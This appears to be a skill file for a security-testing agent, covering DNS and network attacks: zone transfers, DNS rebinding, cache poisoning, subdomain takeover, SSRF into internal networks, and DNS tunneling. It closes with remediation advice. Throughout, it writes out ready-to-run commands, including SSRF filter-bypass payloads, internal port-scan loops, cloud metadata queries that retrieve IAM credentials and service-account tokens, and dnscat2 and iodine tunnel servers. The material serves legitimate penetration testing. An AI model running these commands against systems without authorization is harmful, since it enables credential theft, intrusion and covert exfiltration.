---
name: dns_network
description: DNS and network security testing covering zone transfers, DNS rebinding, subdomain takeover, and network segmentation
---

# DNS & Network Vulnerability Testing

## Overview

DNS and network-layer vulnerabilities allow attackers to enumerate infrastructure, bypass security controls, poison resolutions, and pivot into internal networks. This skill covers systematic testing for DNS misconfigurations, zone transfer exposure, subdomain takeover, DNS rebinding, cache poisoning, and network segmentation weaknesses including SSRF-based internal access.

---

## 1. DNS Zone Transfer (AXFR)

Zone transfers (AXFR) replicate entire DNS zone data between name servers. If misconfigured, any client can request a full zone dump, exposing every host, subdomain, and service record.

### Testing

```bash
# Identify authoritative name servers
dig NS target.com +short

# Attempt zone transfer against each nameserver
dig axfr @ns1.target.com target.com
dig axfr @ns2.target.com target.com

# Try with TSIG (sometimes servers accept any TSIG)
dig axfr @ns1.target.com target.com -y hmac-sha256:fakekey:base64encoded==
```

### What to Look For

- Successful AXFR returns ALL records: A, AAAA, MX, TXT, CNAME, SRV, NS, SOA
- Internal hostnames (e.g., `internal.target.com`, `vpn.target.com`, `staging.target.com`)
- Infrastructure naming patterns revealing architecture (e.g., `db-primary-01.target.com`)
- Service records exposing ports and protocols (SRV records)
- TXT records with SPF/DKIM configs revealing third-party services

### Impact

Full zone enumeration reveals the entire attack surface. Every host, service, and subdomain becomes a known target. Combined with other reconnaissance, this dramatically accelerates compromise.

---

## 2. DNS Rebinding

DNS rebinding bypasses Same-Origin Policy and network access controls by causing a victim's browser to resolve a malicious domain to an internal IP address.

### How It Works

1. Victim visits `attacker-controlled.com`
2. DNS server responds with short TTL and multiple A records
3. First resolution: external IP (legitimate page loads)
4. Second resolution: internal IP (192.168.x.x, 10.x.x.x, 127.0.0.1)
5. Browser reuses same origin, now communicating with internal target

### Testing with Singularity

```bash
# Install Singularity (DNS rebinding framework)
git clone https://github.com/nccgroup/singularity.git
cd singularity && go build

# Configure to target internal service
# Set rebinding strategy: first-answer, multiple-answers, or rotation
./singularity -attack 192.168.1.100:8080

# Access via browser: http://rebind.attacker.com:8080
```

### Testing with rbndr

```bash
# Simple DNS rebinding test
# rbndr returns alternating IPs with short TTL
# Usage: <ip1>-<ip2>.rbndr.io
curl http://1.2.3.4-192.168.1.1.rbndr.io
```

### Use Cases

- Access internal admin panels (Jenkins, Grafana, router UIs)
- Bypass CORS restrictions on internal APIs
- Scan internal network from victim browser
- Read internal web services (printers, IoT devices, databases with web UIs)

### Manual Rebinding Setup

```bash
# Low-TTL DNS record for manual rebinding
# In your DNS zone:
# rebind.attacker.com.  1  IN  A  <your-external-ip>
# Then dynamically switch to:
# rebind.attacker.com.  1  IN  A  192.168.1.1
```

---

## 3. DNS Cache Poisoning

Inject forged DNS responses into a resolver's cache to redirect traffic for legitimate domains.

### Testing for Vulnerable Resolvers

```bash
# Check if resolver uses predictable source ports
nmap -sU -p 53 <resolver-ip>

# Test for Kaminsky-style vulnerability
# Check if resolver accepts responses from non-authoritative sources
# Use fragroute or custom scripts to race legitimate responses

# Check resolver version (may reveal known-vulnerable software)
dig CH TXT version.bind @<resolver-ip>
```

### Attack Techniques

- **Kaminsky Attack**: Flood resolver with forged responses for random subdomains before legitimate response arrives
- **Birthday Attack**: Exploit transaction ID collisions in older resolvers
- **Side-channel attacks**: Use IP fragmentation to inject partial responses

### What to Test

- Resolver accepts responses from arbitrary source ports
- Transaction ID space is predictable (16-bit only)
- Query ID not validated against request
- Resolver recurses for external queries from untrusted networks

### Impact

Traffic interception, credential theft via phishing, malware distribution, and bypass of security controls relying on DNS-based filtering.

---

## 4. Subdomain Enumeration Deep Dive

### Passive Enumeration

```bash
# Certificate Transparency logs
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# crt.sh with wildcards
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

# DNS dump services
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"

# AlienVault OTX
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/target.com/passive_dns" | jq '.passive_dns[].hostname' | sort -u
```

### Active Brute Force

```bash
# Using gobuster DNS mode
gobuster dns -d target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

# Using amass
amass enum -passive -d target.com
amass enum -active -brute -d target.com -w /path/to/wordlist.txt

# Using dnsx
cat subdomains.txt | dnsx -silent -a -aaaa -cname -mx -ns -txt

# Using massdns
massdns -r resolvers.txt -t A -o S -w results.txt subdomains.txt
```

### DNS Record Analysis

```bash
# TXT records often reveal services, verification tokens, configs
dig TXT target.com +short
dig TXT _dmarc.target.com +short
dig TXT default._domainkey.target.com +short

# MX records reveal mail infrastructure
dig MX target.com +short

# CNAME records reveal cloud services and takeover opportunities
dig CNAME app.target.com +short
dig CNAME staging.target.com +short
dig CNAME cdn.target.com +short

# SRV records reveal services and ports
dig SRV _ldap._tcp.target.com +short
dig SRV _sip._tcp.target.com +short
dig SRV _xmpp-server._tcp.target.com +short

# Check for wildcard DNS
dig A randomstring12345.target.com +short
# If returns an IP, wildcard is configured
```

### Subdomain Takeover Verification

```bash
# Check CNAME pointing to deprovisioned cloud services
dig CNAME abandoned-app.target.com +short
# If returns: abandoned-app.herokuapp.com (and Heroku app no longer exists)

# Common takeover targets:
# - AWS S3 buckets (NoSuchBucket)
# - Heroku apps (No such app)
# - Azure (404 Web Site not found)
# - GitHub Pages (There isn't a GitHub Pages site here)
# - Shopify (Sorry, this shop is currently unavailable)
# - Fastly (Fastly error: unknown domain)

# Automated takeover scanning
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt
nuclei -l subdomains.txt -t takeovers/

# Manual verification for S3 bucket takeover
curl -s https://abandoned-bucket.s3.amazonaws.com
# Look for: <Code>NoSuchBucket</Code>
```

---

## 5. Network Segmentation Testing via SSRF

### SSRF to Internal Networks

```bash
# Test SSRF with internal IP ranges
# Common internal ranges to test:
# 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8

# Basic SSRF payload to internal host
curl "https://target.com/fetch?url=http://192.168.1.1/"
curl "https://target.com/fetch?url=http://10.0.0.1/"

# IPv6 SSRF
curl "https://target.com/fetch?url=http://[::1]/"
curl "https://target.com/fetch?url=http://[::ffff:192.168.1.1]/"

# Decimal/octal IP encoding bypass
curl "https://target.com/fetch?url=http://2130706433/"       # 127.0.0.1
curl "https://target.com/fetch?url=http://0177.0.0.1/"       # 127.0.0.1

# URL parsing confusion
curl "https://target.com/fetch?url=http://target.com@192.168.1.1/"
curl "https://target.com/fetch?url=http://192.168.1.1#target.com"
```

### Port Scanning via SSRF

```bash
# Scan internal ports by observing response differences
for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do
  curl -s -o /dev/null -w "%{http_code} %{time_total}" \
    "https://target.com/fetch?url=http://192.168.1.1:${port}/"
  echo " - Port ${port}"
done

# Use response time differences to determine open vs closed ports
# Open ports typically respond faster or with different error codes
```

### Cloud Metadata Access

```bash
# AWS IMDSv1 (no token required)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/user-data/

# AWS IMDSv2 (requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure metadata
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Via SSRF through application
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

### Internal Service Discovery

```bash
# Discover internal services via SSRF responses
# DNS internal names to try:
# consul.service.consul, vault.service.consul
# kubernetes.default.svc.cluster.local
# admin.internal.target.com

# Check for internal admin panels
for host in admin dashboard grafana kibana jenkins gitlab; do
  curl -s "https://target.com/fetch?url=http://${host}.internal/"
done

# Check for common internal APIs
for path in /api /v1 /health /metrics /debug /status; do
  curl -s "https://target.com/fetch?url=http://192.168.1.1${path}"
done
```

---

## 6. DNS-over-HTTPS / DNS-over-TLS Bypass

Security controls that rely on DNS filtering (corporate DNS, parental controls, DNS-based threat intel) can be bypassed using encrypted DNS.

### Testing DoH Bypass

```bash
# Test if application respects system DNS or uses hardcoded DoH
# Check for DoH endpoint usage in traffic captures

# Cloudflare DoH
curl -s -H 'accept: application/dns-json' \
  'https://cloudflare-dns.com/dns-query?name=target.com&type=A'

# Google DoH
curl -s -H 'accept: application/dns-json' \
  'https://dns.google/resolve?name=target.com&type=A'

# Test if blocked domains resolve via DoH
curl -s -H 'accept: application/dns-json' \
  'https://cloudflare-dns.com/dns-query?name=blocked-domain.com&type=A'

# DoT testing (port 853)
nmap -sV -p 853 <resolver-ip>
openssl s_client -connect <resolver-ip>:853 -servername dns.google
```

### DNS Tunneling Detection

```bash
# Check for DNS tunneling tools (iodine, dnscat2, dns2tcp)
# Look for unusually long subdomain queries
# High volume of TXT or NULL record queries
# Random-looking subdomain patterns

# Test if DNS tunneling is possible
# iodine
iodined -f 10.0.0.1 tunnel.target.com

# dnscat2
dnscat2-server tunnel.target.com
```

---

## 7. Key Vulnerability Patterns

### Zone Transfer Exposure (Critical)

```
dig axfr @ns1.target.com target.com
# Returns full zone with internal hosts:
# internal-db.target.com.  IN A 10.0.5.12
# admin-vpn.target.com.   IN A 10.0.1.1
# k8s-api.target.com.     IN A 10.0.10.50
```

### Subdomain Takeover (High)

```
dig CNAME support.target.com
# support.target.com. 300 IN CNAME support.freshdesk.com.
# But Freshdesk account deleted → attacker registers → serves malicious content
```

### Cloud Metadata via SSRF (Critical)

```
# Via application SSRF:
GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
# Response:
# {"role-name": "EC2-Admin-Role"}
# Then:
GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role HTTP/1.1
# Returns AWS access key, secret key, session token
```

### DNS Rebinding to Internal Admin Panel (High)

```
# Attacker hosts page that rebinds to internal Jenkins
# After rebinding, browser fetches http://attacker.com:8080/api/json
# Which resolves to 192.168.1.50:8080 (internal Jenkins)
# Leaks build configs, credentials, source code
```

---

## 8. Validation

For each finding, confirm:

| Vulnerability | Validation Method |
|---|---|
| Zone transfer | Successfully retrieve full zone via `dig axfr` |
| Subdomain takeover | CNAME points to unclaimed service; claim proof-of-concept |
| DNS rebinding | Demonstrate resolution flip from external to internal IP |
| SSRF to metadata | Retrieve actual metadata (instance ID, role name) |
| Cache poisoning | Inject test record that persists in resolver cache |
| Internal port scan | Accurately identify open/closed ports via response differences |

---

## 9. Remediation

### DNS Hardening
- **Disable zone transfers** to unauthorized hosts: configure `allow-transfer` in BIND, or equivalent ACLs
- **Implement DNSSEC** to prevent cache poisoning and response forgery
- **Restrict recursion** to trusted internal clients only: `allow-recursion { trusted; };`
- **Remove stale DNS records** and audit CNAME targets for takeover

### Network Segmentation
- **Block cloud metadata** at network level (iptables/nftables rule to drop 169.254.169.254)
- **IMDSv2 enforcement** on AWS to require token-based metadata access
- **SSRF mitigations**: allowlist outbound URLs, block RFC 1918 ranges in HTTP clients
- **Network ACLs** to prevent application servers from reaching internal management networks

### DNS Privacy & Filtering Bypass
- **Enforce DNS through corporate resolvers** using firewall rules (block outbound 53, 853)
- **TLS inspection** for DoH endpoints if policy requires DNS filtering
- **Monitor for DNS tunneling** via query volume and entropy analysis

### Subdomain Management
- **Regular audits** of CNAME records pointing to third-party services
- **Automated takeover scanning** as part of CI/CD or periodic security reviews
- **Domain monitoring** for certificate transparency log changes
